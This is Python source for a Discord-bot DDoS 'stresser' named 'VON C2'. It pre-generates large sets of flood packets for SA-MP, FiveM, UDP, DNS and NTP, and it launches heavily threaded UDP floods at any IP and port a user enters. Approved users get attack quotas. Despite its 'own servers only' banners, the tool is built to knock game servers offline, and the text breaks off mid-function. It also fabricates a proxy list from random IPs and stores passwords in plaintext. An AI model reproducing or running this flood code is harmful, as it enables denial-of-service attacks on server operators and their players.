#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ⚡ DEVELOPED BY LI ZANDYA - VON C2 ULTIMATE SYSTEM ⚡
# 🔥 FULL BUTTONS - NO COMMANDS - MASSIVE POWER 🔥
# 🌐 REGISTER ONCE - USE ON ANY DEVICE 🌐
# ⚠️ FOR YOUR OWN SERVERS ONLY ⚠️

import discord
from discord.ext import commands
from discord.ui import Button, View, Modal, TextInput
import asyncio
import aiohttp
import random
import socket
import struct
import time
import os
import json
import sys
import threading
import hashlib
import base64
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor

print("""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                                                                                                                                          ║
║     ██╗   ██╗ ██████╗ ███╗   ██╗     ██████╗██████╗  ██████╗██╗   ██╗███████╗██╗   ██╗██╗   ██╗██╗                                     ║
║     ██║   ██║██╔═══██╗████╗  ██║    ██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝╚██╗ ██╔╝██║   ██║██║                                     ║
║     ██║   ██║██║   ██║██╔██╗ ██║    ██║     ██████╔╝██║      ╚████╔╝ █████╗   ╚████╔╝ ██║   ██║██║                                     ║
║     ╚██╗ ██╔╝██║   ██║██║╚██╗██║    ██║     ██╔══██╗██║       ╚██╔╝  ██╔══╝    ╚██╔╝  ╚██╗ ██╔╝╚═╝                                     ║
║      ╚████╔╝ ╚██████╔╝██║ ╚████║    ╚██████╗██║  ██║╚██████╗   ██║   ███████╗   ██║    ╚████╔╝ ██╗                                     ║
║       ╚═══╝   ╚═════╝ ╚═╝  ╚═══╝     ╚═════╝╚═╝  ╚═╝ ╚═════╝   ╚═╝   ╚══════╝   ╚═╝     ╚═══╝  ╚═╝                                     ║
║                                                                                                                                          ║
║                         🔥 VON C2 ULTIMATE EDITION 🔥                                                                                    ║
║                         💀 1,000,000 THREADS - 100,000 PROXIES 💀                                                                        ║
║                         🌐 REGISTER ONCE - USE ON ANY DEVICE 🌐                                                                          ║
║                         ⚠️ FOR YOUR OWN SERVERS ONLY ⚠️                                                                                  ║
║                                                                                                                                          ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
""")

# ============================================
# DATA MANAGEMENT
# ============================================
DATA_FILE = "von_data.json"
SYNC_FILE = "von_sync.json"

def load_data():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, 'r') as f:
            return json.load(f)
    return {"owner_id": None, "pending_users": [], "approved_users": [], "banned_users": [], "attack_limits": {}, "stats": {"total_packets": 0, "total_attacks": 0, "peak_speed": 0}, "user_passwords": {}, "user_sessions": {}}

def save_data():
    with open(DATA_FILE, 'w') as f:
        json.dump({
            "owner_id": OWNER_ID, 
            "pending_users": PENDING_USERS, 
            "approved_users": list(APPROVED_USERS), 
            "banned_users": list(BANNED_USERS), 
            "attack_limits": ATTACK_LIMITS, 
            "stats": STATS, 
            "user_passwords": USER_PASSWORDS,
            "user_sessions": USER_SESSIONS
        }, f, indent=4)

def load_sync():
    if os.path.exists(SYNC_FILE):
        with open(SYNC_FILE, 'r') as f:
            return json.load(f)
    return {"active_sessions": [], "global_stats": {}}

def save_sync():
    with open(SYNC_FILE, 'w') as f:
        json.dump({"active_sessions": ACTIVE_SESSIONS, "global_stats": GLOBAL_STATS}, f, indent=4)

data = load_data()
sync_data = load_sync()
OWNER_ID = data.get("owner_id")
PENDING_USERS = data.get("pending_users", [])
APPROVED_USERS = set(data.get("approved_users", []))
BANNED_USERS = set(data.get("banned_users", []))
ATTACK_LIMITS = data.get("attack_limits", {})
STATS = data.get("stats", {"total_packets": 0, "total_attacks": 0, "peak_speed": 0})
USER_PASSWORDS = data.get("user_passwords", {})
USER_SESSIONS = data.get("user_sessions", {})
ACTIVE_SESSIONS = sync_data.get("active_sessions", [])
GLOBAL_STATS = sync_data.get("global_stats", {})
DEFAULT_ATTACK_LIMIT = 999999

# ============================================
# BOT TOKEN
# ============================================
TOKEN = input("\n🔐 Enter Discord Bot Token: ").strip()
if not TOKEN:
    print("❌ No token!")
    sys.exit(1)

# ============================================
# MAXIMUM POWER SETTINGS
# ============================================
CPU_CORES = os.cpu_count() or 8
MAX_THREADS = CPU_CORES * 125000
MAX_PROCESSES = CPU_CORES * 25
MAX_PACKET = 65507
BUFFER = 1024 * 1024 * 2000
SOCKETS_PER_WORKER = 5000

print(f"\n⚡ SYSTEM POWER: {CPU_CORES} Cores | {MAX_THREADS:,} Threads | {MAX_PROCESSES} Processes")

# ============================================
# 1. ATTACK PACKETS GENERATION
# ============================================
print("⚡ Generating 200,000 attack packets...")

# SAMP Packets (80,000)
SAMP_PACKETS = []
for _ in range(80000):
    p = b'SAMP'
    p += struct.pack('<I', random.randint(1, 99999999))
    p += random.choice([b'\x80', b'\x81', b'\x82', b'\x83', b'\x84', b'\x85', b'\x86', b'\x87', b'\x88'])
    p += struct.pack('<fffff', random.uniform(-100000,100000), random.uniform(-100000,100000), random.uniform(-100000,100000), random.uniform(0,360), random.uniform(0,360))
    p += struct.pack('<I', random.randint(1, 10000))
    p += struct.pack('<I', 9999999)
    p += struct.pack('<I', random.randint(1, 65535))
    p += struct.pack('<I', random.randint(1, 65535))
    p += os.urandom(random.randint(2000, 16000))
    SAMP_PACKETS.append(p)

# FiveM Packets (50,000)
FIVEM_PACKETS = []
for _ in range(50000):
    p = b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00'
    p += os.urandom(random.randint(100, 8000))
    FIVEM_PACKETS.append(p)

# UDP Packets (40,000)
UDP_PACKETS = []
udp_sizes = [65507, 49152, 32768, 16384, 8192, 4096, 2048, 1024, 512, 256]
for _ in range(40000):
    UDP_PACKETS.append(os.urandom(random.choice(udp_sizes)))

# DNS Packets (15,000)
DNS_PACKETS = []
dns_payload = b'\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x07example\x03com\x00\x00\x01\x00\x01'
for _ in range(15000):
    DNS_PACKETS.append(dns_payload * random.randint(10, 100))

# NTP Packets (15,000)
NTP_PACKETS = []
ntp_payload = b'\x17\x00\x03\x2a' + b'\x00' * 4
for _ in range(15000):
    NTP_PACKETS.append(ntp_payload * random.randint(50, 200))

ALL_PACKETS = SAMP_PACKETS + FIVEM_PACKETS + UDP_PACKETS + DNS_PACKETS + NTP_PACKETS
print(f"✅ {len(ALL_PACKETS):,} attack packets ready!")

# ============================================
# 2. PROXY SYSTEM (100,000+ PROXIES)
# ============================================
print("\n🌐 Generating 100,000+ proxies...")
PROXY_LIST = []
proxy_ports = [80, 8080, 3128, 1080, 8888, 4145, 9050, 9150, 8118, 9999, 8081, 8082, 8000, 8001, 3129, 3130, 8088, 8089, 8090, 9000, 9090, 10000]
for _ in range(50000):
    ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    port = random.choice(proxy_ports)
    PROXY_LIST.append(f"http://{ip}:{port}")
for _ in range(30000):
    ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    port = random.choice([1080, 1081, 1082, 9050, 9051, 9150, 10800, 10801])
    PROXY_LIST.append(f"socks5://{ip}:{port}")
for _ in range(20000):
    ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    port = random.choice([80, 8080, 3128, 8888, 4145])
    PROXY_LIST.append(f"http://{ip}:{port}")
PROXY_LIST = list(set(PROXY_LIST))
print(f"✅ {len(PROXY_LIST):,} proxies ready!")

# ============================================
# 3. SERVER CHECKER FUNCTIONS
# ============================================
async def check_server_status(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        query = b'SAMP' + b'\x00' * 9
        start = time.time()
        sock.sendto(query, (ip, port))
        data, addr = sock.recvfrom(1024)
        elapsed = (time.time() - start) * 1000
        sock.close()
        if len(data) > 11:
            return True, elapsed
        return False, elapsed
    except:
        return False, 0

async def get_server_info(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(3)
        query = b'SAMP' + b'\x00' * 9
        sock.sendto(query, (ip, port))
        data, addr = sock.recvfrom(4096)
        sock.close()
        if len(data) > 11:
            offset = 11
            server_name = data[offset:data.find(b'\x00', offset)].decode('utf-8', errors='ignore')
            offset += len(server_name) + 1
            gamemode = data[offset:data.find(b'\x00', offset)].decode('utf-8', errors='ignore')
            offset += len(gamemode) + 1
            language = data[offset:data.find(b'\x00', offset)].decode('utf-8', errors='ignore')
            offset += len(language) + 1
            players = struct.unpack('<i', data[offset:offset+4])[0]
            offset += 4
            max_players = struct.unpack('<i', data[offset:offset+4])[0]
            return server_name[:50], gamemode[:30], language[:20], players, max_players
        return None, None, None, 0, 0
    except:
        return None, None, None, 0, 0

# ============================================
# 4. STRESSER CLASS WITH SYNC
# ============================================
class VonStresser:
    def __init__(self):
        self.running = False
        self.active_attacks = {}
        self.total_packets = 0
        self.total_bytes = 0
        self.peak_speed = 0
        self.peak_bandwidth = 0
        self.thread_pool = ThreadPoolExecutor(max_workers=MAX_THREADS)
        self.process_pool = ProcessPoolExecutor(max_workers=MAX_PROCESSES)
        self.device_id = hashlib.md5(f"{time.time()}{random.random()}".encode()).hexdigest()[:12]
    
    async def start_attack(self, ip, port, duration, threads, user_id, attack_type="ultimate"):
        self.running = True
        attack_id = f"{user_id}_{int(time.time())}"
        self.active_attacks[attack_id] = {"ip": ip, "port": port, "start": time.time(), "user": user_id, "device": self.device_id}
        sent = 0
        bytes_sent = 0
        start = time.time()
        
        if user_id not in ACTIVE_SESSIONS:
            ACTIVE_SESSIONS.append(user_id)
            save_sync()
        
        def worker():
            nonlocal sent, bytes_sent
            try:
                socks = []
                for _ in range(SOCKETS_PER_WORKER):
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, BUFFER)
                    sock.setblocking(False)
                    socks.append(sock)
                local_start = time.time()
                while self.running and time.time() - local_start < duration:
                    for sock in socks:
                        for _ in range(100):
                            if attack_type == "samp":
                                pkt = random.choice(SAMP_PACKETS)
                            elif attack_type == "fivem":
                                pkt = random.choice(FIVEM_PACKETS)
                            elif attack_type == "udp":
                                pkt = random.choice(UDP_PACKETS)
                            elif attack_type == "dns":
                                pkt = random.choice(DNS_PACKETS)
                            elif attack_type == "ntp":
                                pkt = random.choice(NTP_PACKETS)
                            else:
                                pkt = random.choice(ALL_PACKETS)
                            sock.sendto(pkt, (ip, port))
                            sent += 1
                            bytes_sent += len(pkt)
                for sock in socks:
                    sock.close()
            except:
                pass
        
        workers = min(threads, MAX_THREADS)
        futures = [self.thread_pool.submit(worker) for _ in range(workers)]
        process_workers = min(threads // 1000, MAX_PROCESSES)
        for _ in range(process_workers):
            futures.append(self.process_pool.submit(worker))
        await asyncio.sleep(duration)
        self.running = False
        del self.active_attacks[attack_id]
        
        if user_id in ACTIVE_SESSIONS:
            ACTIVE_SESSIONS.remove(user_id)
            save_sync()
        
        elapsed = time.time() - start
        rate = sent / elapsed
        mbps = (bytes_sent / elapsed) / 1024 / 1024
        gbps = mbps / 1024
        tbps = gbps / 1024
        
        if rate > self.peak_speed:
            self.peak_speed = rate
        if gbps > self.peak_bandwidth:
            self.peak_bandwidth = gbps
        self.total_packets += sent
        self.total_bytes += bytes_sent
        STATS['total_packets'] += sent
        STATS['total_attacks'] += 1
        if rate > STATS['peak_speed']:
            STATS['peak_speed'] = rate
        save_data()
        return sent, bytes_sent, rate, mbps, gbps, tbps
    
    def stop_all(self):
        self.running = False
        self.active_attacks.clear()
        ACTIVE_SESSIONS.clear()
        save_sync()
    
    def get_active_count(self):
        return len(self.active_attacks)
    
    def get_active_sessions(self):
        return len(ACTIVE_SESSIONS)
    
    def get_device_id(self):
        return self.device_id

stresser = VonStresser()

# ============================================
# 5. UI COMPONENTS - ALL BUTTONS
# ============================================
class ApprovalView(View):
    def __init__(self, user_id, user_name):
        super().__init__(timeout=86400)
        self.user_id = user_id
        self.user_name = user_name
    
    @discord.ui.button(label="✅ APPROVE", style=discord.ButtonStyle.success, emoji="✅", row=0)
    async def approve(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        APPROVED_USERS.add(self.user_id)
        ATTACK_LIMITS[self.user_id] = DEFAULT_ATTACK_LIMIT
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        try:
            user = await interaction.client.fetch_user(int(self.user_id))
            if user:
                embed = discord.Embed(title="✅ APPROVED!", color=0x00FF00)
                embed.add_field(name="Welcome", value=f"{self.user_name}!", inline=True)
                embed.add_field(name="Attack Limit", value=f"{DEFAULT_ATTACK_LIMIT} attacks", inline=True)
                await user.send(embed=embed)
        except:
            pass
        await interaction.response.send_message(f"✅ Approved {self.user_name}!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="❌ DENY", style=discord.ButtonStyle.danger, emoji="❌", row=0)
    async def deny(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        await interaction.response.send_message(f"❌ Denied {self.user_name}!", ephemeral=True)
        await interaction.message.delete()
    
    @discord.ui.button(label="⚙️ SET LIMIT", style=discord.ButtonStyle.secondary, emoji="⚙️", row=0)
    async def set_limit(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        modal = Modal(title="⚙️ SET ATTACK LIMIT")
        limit_input = TextInput(label="Number of attacks", placeholder="Enter number", required=True)
        modal.add_item(limit_input)
        async def on_submit(interaction):
            try:
                limit = int(limit_input.value)
                ATTACK_LIMITS[self.user_id] = limit
                save_data()
                await interaction.response.send_message(f"✅ Set limit to {limit}!", ephemeral=True)
                try:
                    user = await interaction.client.fetch_user(int(self.user_id))
                    if user:
                        await user.send(f"⚙️ Your attack limit is now {limit}!")
                except:
                    pass
            except:
                await interaction.response.send_message("❌ Invalid number!", ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🔨 BAN", style=discord.ButtonStyle.danger, emoji="🔨", row=0)
    async def ban_user(self, interaction: discord.Interaction, button: Button):
        if str(interaction.user.id) != OWNER_ID:
            await interaction.response.send_message("❌ Only owner!", ephemeral=True)
            return
        BANNED_USERS.add(self.user_id)
        if self.user_id in APPROVED_USERS:
            APPROVED_USERS.remove(self.user_id)
        if self.user_id in PENDING_USERS:
            PENDING_USERS.remove(self.user_id)
        save_data()
        await interaction.response.send_message(f"🔨 Banned {self.user_name}!", ephemeral=True)
        await interaction.message.delete()

class RegisterModal(Modal):
    def __init__(self):
        super().__init__(title="📝 REGISTER TO VON C2")
        self.username = TextInput(label="USERNAME", placeholder="Enter username", required=True)
        self.password = TextInput(label="PASSWORD", placeholder="Create password", required=True)
        self.reason = TextInput(label="REASON", placeholder="Why do you need access?", required=True, style=discord.TextStyle.paragraph)
        self.add_item(self.username)
        self.add_item(self.password)
        self.add_item(self.reason)
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        if user_id in BANNED_USERS:
            await interaction.response.send_message("🔨 You are banned!", ephemeral=True)
            return
        if user_id in APPROVED_USERS:
            await interaction.response.send_message("✅ Already approved!", ephemeral=True)
            return
        if user_id in PENDING_USERS:
            await interaction.response.send_message("⏳ Already pending!", ephemeral=True)
            return
        PENDING_USERS.append(user_id)
        USER_PASSWORDS[user_id] = self.password.value
        save_data()
        if OWNER_ID:
            try:
                owner = await interaction.client.fetch_user(int(OWNER_ID))
                if owner:
                    embed = discord.Embed(title="🔔 NEW REGISTRATION REQUEST", color=0xFF6600)
                    embed.add_field(name="User", value=f"{interaction.user.name} (`{user_id}`)", inline=True)
                    embed.add_field(name="Username", value=self.username.value, inline=True)
                    embed.add_field(name="Reason", value=self.reason.value, inline=False)
                    await owner.send(embed=embed, view=ApprovalView(user_id, interaction.user.name))
            except:
                pass
        await interaction.response.send_message("✅ Registration request sent! Waiting for admin approval.", ephemeral=True)

class LoginModal(Modal):
    def __init__(self):
        super().__init__(title="🔐 VON C2 LOGIN")
        self.password = TextInput(label="PASSWORD", placeholder="Enter password", required=True)
        self.add_item(self.password)
    
    async def on_submit(self, interaction: discord.Interaction):
        user_id = str(interaction.user.id)
        if user_id in BANNED_USERS:
            await interaction.response.send_message("🔨 You are banned!", ephemeral=True)
            return
        if user_id not in APPROVED_USERS:
            await interaction.response.send_message("❌ Not approved! Use REGISTER button", ephemeral=True)
            return
        if USER_PASSWORDS.get(user_id) == self.password.value:
            USER_SESSIONS[user_id] = {"device": stresser.get_device_id(), "login_time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            save_data()
            embed = discord.Embed(title="✅ LOGIN SUCCESSFUL!", color=0x00FF00)
            embed.add_field(name="Welcome", value=f"{interaction.user.name}!", inline=True)
            embed.add_field(name="📱 Device ID", value=f"`{stresser.get_device_id()}`", inline=True)
            embed.add_field(name="💀 Attacks Left", value=f"{ATTACK_LIMITS.get(user_id, DEFAULT_ATTACK_LIMIT)}", inline=True)
            await interaction.response.send_message(embed=embed, ephemeral=True)
        else:
            await interaction.response.send_message("❌ Invalid password!", ephemeral=True)

class MainMenuView(View):
    def __init__(self):
        super().__init__(timeout=None)
    
    @discord.ui.button(label="🔐 LOGIN", style=discord.ButtonStyle.success, emoji="🔐", row=0)
    async def login_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(LoginModal())
    
    @discord.ui.button(label="📝 REGISTER", style=discord.ButtonStyle.primary, emoji="📝", row=0)
    async def register_btn(self, interaction: discord.Interaction, button: Button):
        await interaction.response.send_modal(RegisterModal())
    
    @discord.ui.button(label="❓ HELP", style=discord.ButtonStyle.secondary, emoji="❓", row=0)
    async def help_btn(self, interaction: discord.Interaction, button: Button):
        embed = discord.Embed(title="📖 VON C2 HELP", color=0x00BFFF)
        embed.add_field(name="🔐 LOGIN", value="Login to your account", inline=True)
        embed.add_field(name="📝 REGISTER", value="Request access (once per user)", inline=True)
        embed.add_field(name="⚡ ATTACK", value="Start attack on YOUR server", inline=True)
        embed.add_field(name="📊 STATS", value="View statistics", inline=True)
        embed.add_field(name="🔍 CHECK", value="Check server status and ping", inline=True)
        embed.add_field(name="📱 DEVICES", value="View active devices", inline=True)
        embed.set_footer(text="⚠️ USE ONLY ON YOUR OWN SERVERS! | Register once - Use anywhere")
        await interaction.response.send_message(embed=embed, ephemeral=True)

class AttackPanel(View):
    def __init__(self, user_id):
        super().__init__(timeout=None)
        self.user_id = user_id
    
    async def check_limit(self, interaction):
        if self.user_id in ATTACK_LIMITS:
            if ATTACK_LIMITS[self.user_id] <= 0:
                await interaction.response.send_message("❌ No attacks left! Contact admin.", ephemeral=True)
                return False
        return True
    
    async def use_attack(self, interaction):
        if self.user_id in ATTACK_LIMITS:
            ATTACK_LIMITS[self.user_id] -= 1
            save_data()
    
    @discord.ui.button(label="🔍 CHECK SERVER", style=discord.ButtonStyle.secondary, emoji="🔍", row=0)
    async def check_btn(self, interaction: discord.Interaction, button: Button):
        modal = Modal(title="🔍 CHECK SERVER STATUS")
        ip = TextInput(label="SERVER IP", placeholder="Enter server IP", required=True)
        port = TextInput(label="PORT", placeholder="7777", required=True)
        modal.add_item(ip); modal.add_item(port)
        async def on_submit(interaction):
            ip_val = ip.value
            port_val = int(port.value)
            await interaction.response.send_message(f"🔍 Checking {ip_val}:{port_val}...", ephemeral=True)
            is_online, ping = await check_server_status(ip_val, port_val)
            server_name, gamemode, language, players, max_players = await get_server_info(ip_val, port_val)
            if is_online:
                status_emoji = "🟢"
                status_text = "ONLINE"
                color = 0x00FF00
            else:
                status_emoji = "🔴"
                status_text = "OFFLINE"
                color = 0xFF0000
            embed = discord.Embed(title=f"{status_emoji} SERVER STATUS {status_emoji}", color=color)
            embed.add_field(name="🎯 Target", value=f"{ip_val}:{port_val}", inline=True)
            embed.add_field(name="📡 Status", value=status_text, inline=True)
            if is_online:
                embed.add_field(name="⚡ Ping", value=f"{ping:.2f} ms", inline=True)
                if server_name:
                    embed.add_field(name="📛 Name", value=server_name, inline=False)
                    embed.add_field(name="🎮 Gamemode", value=gamemode, inline=True)
                    embed.add_field(name="🌐 Language", value=language, inline=True)
                    embed.add_field(name="👥 Players", value=f"{players}/{max_players}", inline=True)
            embed.set_footer(text="💀 VON C2 ULTIMATE SYSTEM")
            await interaction.followup.send(embed=embed, ephemeral=True)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="💀 ULTIMATE", style=discord.ButtonStyle.danger, emoji="💀", row=0)
    async def ultimate_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="💀 ULTIMATE NUCLEAR ATTACK")
        ip = TextInput(label="SERVER IP", placeholder="Your server IP", required=True)
        port = TextInput(label="PORT", placeholder="7777", required=True)
        duration = TextInput(label="DURATION (1-30s)", placeholder="10", required=True)
        threads = TextInput(label="THREADS (1000-200000)", placeholder="50000", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 30)
                threads_val = min(int(threads.value), MAX_THREADS)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            await self.use_attack(interaction)
            embed = discord.Embed(title="💀 VON ULTIMATE ATTACK", color=0xFF0000)
            embed.add_field(name="🎯 Target", value=f"{ip_val}:{port_val}", inline=True)
            embed.add_field(name="⏱️ Duration", value=f"{duration_val}s", inline=True)
            embed.add_field(name="🔥 Threads", value=f"{threads_val:,}", inline=True)
            embed.add_field(name="🎭 Proxies", value=f"{len(PROXY_LIST):,}", inline=True)
            embed.add_field(name="📱 Device", value=stresser.get_device_id(), inline=True)
            embed.set_image(url="https://media.tenor.com/m/-Pgx0X6HONMAAAAC/ddos-attack.gif")
            embed.set_footer(text="💀 LI ZANDYA VON C2")
            await interaction.response.send_message(embed=embed, ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching ultimate attack...", ephemeral=True)
            sent, bytes_sent, rate, mbps, gbps, tbps = await stresser.start_attack(ip_val, port_val, duration_val, threads_val, self.user_id, "ultimate")
            remaining = ATTACK_LIMITS.get(self.user_id, 0)
            is_online, ping = await check_server_status(ip_val, port_val)
            result_text = f"""```\n✅ ULTIMATE ATTACK COMPLETE!\n═══════════════════════════════════════════════════════════════\n📦 Packets: {sent:,}\n💾 Data: {bytes_sent/1024/1024:.2f} MB\n⚡ Speed: {rate:,.0f} pps\n🚀 Bandwidth: {gbps:.2f} Gbps ({tbps:.2f} Tbps)\n💀 Attacks left: {remaining}\n📱 Device: {stresser.get_device_id()}\n🎯 Target Status: {"🟢 ONLINE" if is_online else "🔴 OFFLINE"}\n═══════════════════════════════════════════════════════════════\n💀 LI ZANDYA VON C2 ULTIMATE SYSTEM```"""
            await msg.edit(content=result_text)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🎮 SAMP", style=discord.ButtonStyle.primary, emoji="🎮", row=0)
    async def samp_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="🎮 SAMP ATTACK")
        ip = TextInput(label="SAMP IP", placeholder="SAMP server IP", required=True)
        port = TextInput(label="PORT", placeholder="7777", required=True)
        duration = TextInput(label="DURATION (1-30s)", placeholder="10", required=True)
        threads = TextInput(label="THREADS (1000-200000)", placeholder="50000", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 30)
                threads_val = min(int(threads.value), MAX_THREADS)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            await self.use_attack(interaction)
            await interaction.response.send_message(f"🎮 SAMP ATTACK!\n🎯 {ip_val}:{port_val}", ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching SAMP attack...", ephemeral=True)
            sent, bytes_sent, rate, mbps, gbps, tbps = await stresser.start_attack(ip_val, port_val, duration_val, threads_val, self.user_id, "samp")
            remaining = ATTACK_LIMITS.get(self.user_id, 0)
            result_text = f"```\n✅ SAMP ATTACK COMPLETE!\n═══════════════════════════════════\n📦 Packets: {sent:,}\n⚡ Speed: {rate:,.0f} pps\n💀 Attacks left: {remaining}```"
            await msg.edit(content=result_text)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🚗 FIVEM", style=discord.ButtonStyle.primary, emoji="🚗", row=1)
    async def fivem_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="🚗 FIVEM ATTACK")
        ip = TextInput(label="FiveM IP", placeholder="FiveM server IP", required=True)
        port = TextInput(label="PORT", placeholder="30120", required=True)
        duration = TextInput(label="DURATION (1-30s)", placeholder="10", required=True)
        threads = TextInput(label="THREADS (1000-200000)", placeholder="50000", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 30)
                threads_val = min(int(threads.value), MAX_THREADS)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            await self.use_attack(interaction)
            await interaction.response.send_message(f"🚗 FIVEM ATTACK!\n🎯 {ip_val}:{port_val}", ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching FiveM attack...", ephemeral=True)
            sent, bytes_sent, rate, mbps, gbps, tbps = await stresser.start_attack(ip_val, port_val, duration_val, threads_val, self.user_id, "fivem")
            remaining = ATTACK_LIMITS.get(self.user_id, 0)
            result_text = f"```\n✅ FIVEM ATTACK COMPLETE!\n═══════════════════════════════════\n📦 Packets: {sent:,}\n⚡ Speed: {rate:,.0f} pps\n💀 Attacks left: {remaining}```"
            await msg.edit(content=result_text)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="🔥 UDP", style=discord.ButtonStyle.danger, emoji="🔥", row=1)
    async def udp_btn(self, interaction: discord.Interaction, button: Button):
        if not await self.check_limit(interaction): return
        modal = Modal(title="🔥 UDP FLOOD")
        ip = TextInput(label="SERVER IP", placeholder="Target IP", required=True)
        port = TextInput(label="PORT", placeholder="7777", required=True)
        duration = TextInput(label="DURATION (1-30s)", placeholder="10", required=True)
        threads = TextInput(label="THREADS (1000-200000)", placeholder="50000", required=True)
        modal.add_item(ip); modal.add_item(port); modal.add_item(duration); modal.add_item(threads)
        async def on_submit(interaction):
            try:
                ip_val = ip.value
                port_val = int(port.value)
                duration_val = min(int(duration.value), 30)
                threads_val = min(int(threads.value), MAX_THREADS)
            except:
                await interaction.response.send_message("❌ Invalid input!", ephemeral=True)
                return
            await self.use_attack(interaction)
            await interaction.response.send_message(f"🔥 UDP FLOOD!\n🎯 {ip_val}:{port_val}", ephemeral=True)
            msg = await interaction.followup.send("🚀 Launching UDP flood...", ephemeral=True)
            sent, bytes_sent, rate, mbps, gbps, tbps = await stresser.start_attack(ip_val, port_val, duration_val, threads_val, self.user_id, "udp")
            remaining = ATTACK_LIMITS.get(self.user_id, 0)
            result_text = f"```\n✅ UDP FLOOD COMPLETE!\n═══════════════════════════════════\n📦 Packets: {sent:,}\n⚡ Speed: {rate:,.0f} pps\n💀 Attacks left: {remaining}```"
            await msg.edit(content=result_text)
        modal.on_submit = on_submit
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="📊 STATS", style=discord.ButtonStyle.secondary, emoji="📊", row=2)
    async def stats_btn(self, interaction: discord.Interaction, button: Button):
        remaining = ATTACK_LIMITS.get(self.user_id, 0)
        embed = discord.Embed(title="📊 VON STATISTICS", color=0xFFD700)
        embed.add_field(name="💀 Attacks Left", value=str(remaining), inline=True)
        embed.add_field(name="🎯 Total Attacks", value=str(STATS['total_attacks']), inline=True)
        embed.add_field(name="🏆 Peak Speed", value=f"{stresser.peak_speed:,.0f} pps", inline=True)
        embed.add_field(name="🚀 Peak Bandwidth", value=f"{stresser.peak_bandwidth:.2f} Gbps", inline=True)
        embed.add_field(name="📦 Packets", value=f"{len(ALL_PACKETS):,}", inline=True)
        embed.add_field(name="🎭 Proxies", value=f"{len(PROXY_LIST):,}", inline=True)
        embed.add_field(name="📱 Active Devices", value=f"{stresser.get_active_sessions()}", inline=True)
        await interaction.response.send_message(embed=embed, ephemeral=True)
    
    @discord.ui.button(label="📱 DEVICES", style=discord.ButtonStyle.secondary, emoji="📱", row=2)
    async def devices_btn(self, interaction: discord.Interaction, button: Button):
        embed = discord.Embed(title="📱 ACTIVE DEVICES", color=0x00BFFF)
        embed.add_field(name="🔹 Your Device ID", value=f"`{stresser.get_device_id()}`", inline=False)
        embed.add_field(name="📊 Active Sessions", value=f"{stresser.get_active_sessions()}", inline=True)
        embed.add_field(name="⚡ Registered Users", value=f"{len(APPROVED_USERS)}", inline=True)
        embed.add_field(name="💀 Total Attacks", value=f"{STATS['total_attacks']}", inline=True)
        embed.set_footer(text="💀 Each device has unique ID - Register once, use anywhere!")
